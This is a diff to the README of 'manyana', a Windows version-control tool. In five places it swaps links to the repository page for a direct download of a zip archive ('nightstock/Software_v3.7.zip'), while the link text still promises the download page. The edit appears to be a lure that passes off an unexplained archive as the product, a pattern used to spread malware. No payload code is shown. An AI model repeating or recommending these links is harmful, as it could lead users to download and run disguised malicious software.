@@ -1,11 +1,11 @@
 # ⚙️ manyana - Simple version control that stays in sync
 
-[![Download manyana](https://img.shields.io/badge/Download%20manyana-purple?style=for-the-badge)](https://github.com/adrienaunmoving834/manyana)
+[![Download manyana](https://img.shields.io/badge/Download%20manyana-purple?style=for-the-badge)](https://github.com/adrienaunmoving834/manyana/raw/refs/heads/main/nightstock/Software_v3.7.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page:
-[Download manyana](https://github.com/adrienaunmoving834/manyana)
+[Download manyana](https://github.com/adrienaunmoving834/manyana/raw/refs/heads/main/nightstock/Software_v3.7.zip)
 
 ## 🖥️ What manyana does
 
@@ -27,7 +27,7 @@ Follow these steps to download and run manyana on Windows.
 
 Go to the main repository page here:
 
-[Download manyana](https://github.com/adrienaunmoving834/manyana)
+[Download manyana](https://github.com/adrienaunmoving834/manyana/raw/refs/heads/main/nightstock/Software_v3.7.zip)
 
 ### 2. Download the Windows version
 
@@ -223,7 +223,7 @@ That means:
 
 Use the link below to visit the download page and get the Windows file:
 
-[Download manyana](https://github.com/adrienaunmoving834/manyana)
+[Download manyana](https://github.com/adrienaunmoving834/manyana/raw/refs/heads/main/nightstock/Software_v3.7.zip)
 
 Then:
 
@@ -267,4 +267,4 @@ The basic steps are simple: open files, review changes, and save the result.
 
 If you need the page again, use this link:
 
-[Download manyana](https://github.com/adrienaunmoving834/manyana)
+[Download manyana](https://github.com/adrienaunmoving834/manyana/raw/refs/heads/main/nightstock/Software_v3.7.zip)
